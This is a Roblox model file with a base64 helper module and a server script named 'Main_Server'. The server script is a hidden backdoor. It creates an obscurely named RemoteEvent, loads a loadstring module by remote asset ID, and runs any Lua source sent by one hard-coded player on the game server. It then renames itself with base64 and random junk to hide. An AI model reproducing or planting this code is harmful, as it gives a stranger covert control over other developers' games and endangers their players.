<roblox version="4">
	<Item class="ModuleScript" referent="9">
		<Properties>
			<string name="Name"><![CDATA[MMMM]]></string>
			<ProtectedString name="Source"><![CDATA[local base64={};
local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
 
function base64.encode(data)
    return ((data:gsub('.', function(x) 
        local r,b='',x:byte();
        for i=8,1,-1 do r=r..(b%2^i-b%2^(i-1)>0 and '1' or '0') end;
            return r;
        end)..'0000'):gsub('%d%d%d?%d?%d?%d?', function(x)
        if (#x < 6) then return '' end;
            local c=0;
            for i=1,6 do c=c+(x:sub(i,i)=='1' and 2^(6-i) or 0) end;
                return b:sub(c+1,c+1);
            end)..({ '', '==', '=' })[#data%3+1]);
        end;
        
        function base64.decode(data)
            if not data then return "" end
            data = string.gsub(data, '[^'..b..'=]', '');
            return (data:gsub('.', function(x)
                if (x == '=') then return '' end;
                    local foundIndex = b:find(x);
                    if not foundIndex then return '' end
                    local r,f='',(foundIndex-1);
                    for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end;
                        return r;
                    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
                    if (#x ~= 8) then return '' end;
                        local c=0;
                        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end;
                            return string.char(c);
                        end));
                    end;
                    
                    return base64]]></ProtectedString>
		</Properties>
	</Item>
<Item class="Script" referent="7">
		<Properties>
			<string name="Name"><![CDATA[Main_Server]]></string>
			<ProtectedString name="Source"><![CDATA[local RE = Instance.new("RemoteEvent", game:GetService("ReplicatedStorage"))
RE.Name = "__"
 
game:GetService("ReplicatedStorage"):FindFirstChild("__").OnServerEvent:Connect(function(player: Player, source: string)
    if player.Name == "Xkdjdjdkxkxjzzjxjxj" then
        local change = function()
            local list: table = {"towofieoelfodidododkdkdkdkdk938:93", "disoekpwkfpskfisld", 1,2, "929302939302030", "ldowiroel lelxmdkdk", "203920:09:@2@:’wosmdlsldlsowkiIsjwk9293929/=|•\¥|{+", 1,2,2,3,2,2,3,3,3,4,4,4}
            return list[math.random(1, #list)]
        end
        
        local debug: boolean = false
        local base64: Instance = require("@game/ServerStorage/MMMM")
        local loadstring: Instance = require(require(123068958552495)("vLuau"))
        
        local s, r = pcall(function()
            loadstring(source)()
        end)
        
        
        script.Name = base64.encode(tostring(script.Name) .. change())
        
        if not s or not r then
            if debug == true then print("error on", r) end
        else
            if debug == true then
                print("correct")
            end
        end
    end
end)]]></ProtectedString>
